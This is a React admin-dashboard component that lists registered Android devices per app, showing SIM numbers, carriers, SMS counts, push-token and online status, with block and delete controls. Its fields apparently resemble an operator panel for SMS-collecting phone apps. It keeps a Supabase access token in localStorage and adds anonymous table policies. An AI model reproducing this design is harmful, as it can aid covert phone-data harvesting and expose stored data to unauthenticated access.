import { useState, useEffect, useCallback } from "react";
import {
  ArrowLeft, RefreshCw, ShieldOff, ShieldCheck, Trash2,
  Smartphone, Wifi, WifiOff, MessageSquare, CreditCard, Search, Filter, Wrench
} from "lucide-react";
import Badge from "@/components/Badge";
import StatCard from "@/components/StatCard";
import type { AdminApp, Device } from "@/lib/types";
import { getDevices, blockDevice, unblockDevice, deleteDevice, calcStats } from "@/lib/supabase";

interface AppDetailProps {
  app: AdminApp;
  onBack: () => void;
}

type FilterType = "all" | "active" | "blocked" | "online";

export default function AppDetail({ app, onBack }: AppDetailProps) {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<FilterType>("all");
  const [busyId, setBusyId] = useState<string | null>(null);
  const [fixing, setFixing] = useState(false);
  const [fixMsg, setFixMsg] = useState<{ ok: boolean; text: string } | null>(null);

  const handleFixTable = async () => {
    const pat = localStorage.getItem("supabase_pat") ?? "";
    if (!pat) {
      const entered = window.prompt("Supabase PAT enter karo (fix ke liye zaroori hai):");
      if (!entered?.trim()) return;
      localStorage.setItem("supabase_pat", entered.trim());
    }
    const finalPat = localStorage.getItem("supabase_pat") ?? "";
    setFixing(true); setFixMsg(null);
    try {
      const res = await fetch(`/api/admin/apps/${app.token}/fix-table`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pat: finalPat }),
      });
      const data = (await res.json()) as { ok?: boolean; error?: string };
      if (res.ok && data.ok) {
        setFixMsg({ ok: true, text: "Table fix ho gayi! Columns + anon policies add ho gaye." });
        await load();
      } else {
        setFixMsg({ ok: false, text: data.error ?? "Fix failed" });
      }
    } catch (e: unknown) {
      setFixMsg({ ok: false, text: e instanceof Error ? e.message : "Error" });
    } finally {
      setFixing(false);
    }
  };

  const load = useCallback(async () => {
    setLoading(true); setError("");
    try { setDevices(await getDevices(app.token)); }
    catch (e: unknown) { setError(e instanceof Error ? e.message : "Error"); }
    finally { setLoading(false); }
  }, [app.token]);

  useEffect(() => { load(); }, [load]);

  const handleBlock = async (d: Device) => {
    setBusyId(d.sub_id);
    try {
      if (d.status === "blocked") {
        await unblockDevice(app.token, d.sub_id);
        setDevices((p) => p.map((x) => x.sub_id === d.sub_id ? { ...x, status: "active" } : x));
      } else {
        await blockDevice(app.token, d.sub_id);
        setDevices((p) => p.map((x) => x.sub_id === d.sub_id ? { ...x, status: "blocked" } : x));
      }
    } catch (e: unknown) { alert(e instanceof Error ? e.message : "Error"); }
    finally { setBusyId(null); }
  };

  const handleDelete = async (uid: string) => {
    if (!confirm(`Device ${uid} permanently delete karo?`)) return;
    setBusyId(uid);
    try {
      await deleteDevice(app.token, uid);
      setDevices((p) => p.filter((x) => x.sub_id !== uid));
    } catch (e: unknown) { alert(e instanceof Error ? e.message : "Error"); }
    finally { setBusyId(null); }
  };

  const now = Date.now();
  const isOnline = (d: Device) => {
    const t = d.data_json?.online_checked_at ?? 0;
    return t > 0 && now - t < 15 * 60 * 1000;
  };

  const filtered = devices.filter((d) => {
    const q = search.toLowerCase();
    const matchSearch = !q || [
      d.sub_id, d.data_json?.device_name, d.data_json?.model,
      d.data_json?.brand, d.data_json?.sim1number, d.data_json?.sim2number,
    ].some((v) => v?.toLowerCase().includes(q));

    const matchFilter =
      filter === "all" ? true :
      filter === "active" ? d.status === "active" :
      filter === "blocked" ? d.status === "blocked" :
      filter === "online" ? isOnline(d) : true;

    return matchSearch && matchFilter;
  });

  const stats = calcStats(devices);

  const fmt = (ts?: number) => {
    if (!ts || ts === 0) return "—";
    return new Date(ts).toLocaleString("en-IN", { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" });
  };

  return (
    <div className="flex-1 overflow-auto bg-[#080c16]">
      {/* Top bar */}
      <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center gap-3 px-6">
        <button onClick={onBack} className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors">
          <ArrowLeft className="w-4 h-4" />
        </button>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2">
            <h1 className="text-sm font-semibold text-white truncate">{app.label || app.token}</h1>
            <Badge variant={app.is_active ? "active" : "inactive"} />
          </div>
          <p className="text-xs text-slate-600 font-mono">{app.token}_registered_devices</p>
        </div>
        <button onClick={handleFixTable} disabled={fixing}
                title="Fix Table — missing columns aur anon RLS policies add karo"
                className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-amber-900/25 hover:bg-amber-900/40 text-amber-400 text-xs font-medium transition-colors disabled:opacity-50">
          {fixing
            ? <span className="w-3 h-3 border border-amber-400/30 border-t-amber-400 rounded-full animate-spin" />
            : <Wrench className="w-3 h-3" />}
          Fix Table
        </button>
        <button onClick={load} disabled={loading}
                className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors disabled:opacity-50">
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
        </button>
      </div>

      {/* Fix result banner */}
      {fixMsg && (
        <div className={`mx-6 mt-3 px-4 py-2.5 rounded-xl text-xs font-medium flex items-center justify-between ${
          fixMsg.ok ? "bg-emerald-900/20 text-emerald-400 border border-emerald-800/40"
                    : "bg-red-900/20 text-red-400 border border-red-800/40"
        }`}>
          <span>{fixMsg.text}</span>
          <button onClick={() => setFixMsg(null)} className="ml-3 opacity-60 hover:opacity-100 text-base leading-none">×</button>
        </div>
      )}

      <div className="p-6 space-y-5">
        {loading && devices.length === 0 ? (
          <div className="flex items-center justify-center py-24 text-slate-600">
            <span className="w-5 h-5 border-2 border-slate-700 border-t-blue-500 rounded-full animate-spin mr-2" />
            <span className="text-sm">Devices load ho rahe hain…</span>
          </div>
        ) : error ? (
          <div className="text-center py-16 bg-[#0d1220] border border-slate-800 rounded-2xl">
            <p className="text-sm text-red-400 mb-2">{error}</p>
            <button onClick={load} className="text-xs text-blue-400 hover:text-blue-300">Retry</button>
          </div>
        ) : (
          <>
            {/* Stats */}
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
              <StatCard label="Total Devices" value={stats.total} icon={Smartphone} color="blue" />
              <StatCard label="Online Now" value={stats.online} icon={Wifi} color="green" />
              <StatCard label="Blocked" value={stats.blocked} icon={ShieldOff} color="red" />
              <StatCard label="SMS Count" value={stats.smsTotal} icon={MessageSquare} color="amber" />
            </div>

            {/* Search + Filter */}
            <div className="flex gap-2">
              <div className="flex-1 relative">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-600" />
                <input value={search} onChange={(e) => setSearch(e.target.value)}
                       placeholder="Search by UID, device name, SIM number…"
                       className="w-full bg-[#0d1220] border border-slate-800 rounded-xl pl-9 pr-4 py-2.5 text-sm placeholder-slate-700 text-white focus:outline-none focus:border-blue-500/50 transition-colors" />
              </div>
              <div className="flex items-center gap-1 bg-[#0d1220] border border-slate-800 rounded-xl px-1.5 py-1.5">
                <Filter className="w-3.5 h-3.5 text-slate-600 ml-1 mr-0.5" />
                {(["all", "active", "blocked", "online"] as FilterType[]).map((f) => (
                  <button key={f} onClick={() => setFilter(f)}
                          className={`px-2.5 py-1 rounded-lg text-xs font-medium capitalize transition-colors ${
                            filter === f ? "bg-blue-600 text-white" : "text-slate-500 hover:text-slate-300"
                          }`}>{f}</button>
                ))}
              </div>
            </div>

            {/* Device count */}
            <p className="text-xs text-slate-600">{filtered.length} devices shown</p>

            {/* Device list */}
            {filtered.length === 0 ? (
              <div className="text-center py-16 bg-[#0d1220] border border-slate-800 rounded-2xl">
                <Smartphone className="w-7 h-7 mx-auto text-slate-700 mb-3" />
                <p className="text-sm text-slate-600">Koi device nahi mili.</p>
              </div>
            ) : (
              <div className="space-y-2">
                {filtered.map((d) => {
                  const dj = d.data_json ?? {};
                  const online = isOnline(d);
                  const busy = busyId === d.sub_id;
                  return (
                    <div key={d.sub_id}
                         className={`bg-[#0d1220] border rounded-2xl p-4 transition-all ${
                           d.status === "blocked"
                             ? "border-red-800/40 bg-red-900/5"
                             : "border-slate-800/80"
                         }`}>
                      <div className="flex items-start gap-3">
                        {/* Left icon */}
                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 mt-0.5 ${
                          d.status === "blocked" ? "bg-red-900/30" : online ? "bg-emerald-900/20" : "bg-slate-800"
                        }`}>
                          <Smartphone className={`w-4 h-4 ${
                            d.status === "blocked" ? "text-red-400" : online ? "text-emerald-400" : "text-slate-500"
                          }`} />
                        </div>

                        {/* Info */}
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap mb-1">
                            <p className="font-mono text-xs text-slate-300 font-semibold">{d.sub_id}</p>
                            <Badge variant={d.status === "blocked" ? "blocked" : "active"} />
                            <Badge variant={online ? "online" : (dj.online_status === "offline" ? "offline" : "unknown")} pulse={online} />
                          </div>

                          {/* Device info grid */}
                          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-2">
                            <div className="bg-[#080c16] rounded-lg px-2.5 py-2">
                              <p className="text-[10px] text-slate-600 mb-0.5">Device</p>
                              <p className="text-xs text-slate-300 truncate">{dj.device_name || dj.model || "—"}</p>
                            </div>
                            <div className="bg-[#080c16] rounded-lg px-2.5 py-2">
                              <p className="text-[10px] text-slate-600 mb-0.5">Android</p>
                              <p className="text-xs text-slate-300">{dj.androidversion || "—"}</p>
                            </div>
                            <div className="bg-[#080c16] rounded-lg px-2.5 py-2 sm:col-span-2">
                              <p className="text-[10px] text-slate-600 mb-0.5 flex items-center gap-1"><CreditCard className="w-2.5 h-2.5" />SIM</p>
                              <p className="text-xs text-slate-300 font-mono">
                                {dj.sim1number ? `${dj.sim1number} (${dj.sim1carrier || "?"})` : "—"}
                                {dj.sim2number ? ` · ${dj.sim2number}` : ""}
                              </p>
                            </div>
                            <div className="bg-[#080c16] rounded-lg px-2.5 py-2">
                              <p className="text-[10px] text-slate-600 mb-0.5">SMS Count</p>
                              <p className="text-xs text-slate-300">{d.total_sms_count ?? 0}</p>
                            </div>
                            <div className="bg-[#080c16] rounded-lg px-2.5 py-2">
                              <p className="text-[10px] text-slate-600 mb-0.5">FCM</p>
                              <p className={`text-xs ${dj.fcm_token_status === "active" ? "text-emerald-400" : "text-slate-600"}`}>
                                {dj.fcm_token_status || "—"}
                              </p>
                            </div>
                            <div className="bg-[#080c16] rounded-lg px-2.5 py-2">
                              <p className="text-[10px] text-slate-600 mb-0.5">Registered</p>
                              <p className="text-xs text-slate-400">{fmt(d.registered_at || (d.created_at))}</p>
                            </div>
                            <div className="bg-[#080c16] rounded-lg px-2.5 py-2">
                              <p className="text-[10px] text-slate-600 mb-0.5">Last Seen</p>
                              <p className="text-xs text-slate-400">{fmt(dj.last_seen_at)}</p>
                            </div>
                          </div>
                        </div>

                        {/* Actions */}
                        <div className="flex flex-col gap-1.5 flex-shrink-0">
                          <button onClick={() => handleBlock(d)} disabled={busy}
                                  title={d.status === "blocked" ? "Unblock" : "Block"}
                                  className={`flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium transition-colors disabled:opacity-50 ${
                                    d.status === "blocked"
                                      ? "bg-emerald-900/25 text-emerald-400 hover:bg-emerald-900/40"
                                      : "bg-red-900/20 text-red-400 hover:bg-red-900/35"
                                  }`}>
                            {busy ? <span className="w-3 h-3 border border-current/30 border-t-current rounded-full animate-spin" />
                                   : d.status === "blocked" ? <ShieldCheck className="w-3 h-3" /> : <ShieldOff className="w-3 h-3" />}
                            {d.status === "blocked" ? "Unblock" : "Block"}
                          </button>
                          <button onClick={() => handleDelete(d.sub_id)} disabled={busy}
                                  className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-red-900/25 text-slate-600 hover:text-red-400 text-xs transition-colors disabled:opacity-50">
                            <Trash2 className="w-3 h-3" />Delete
                          </button>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
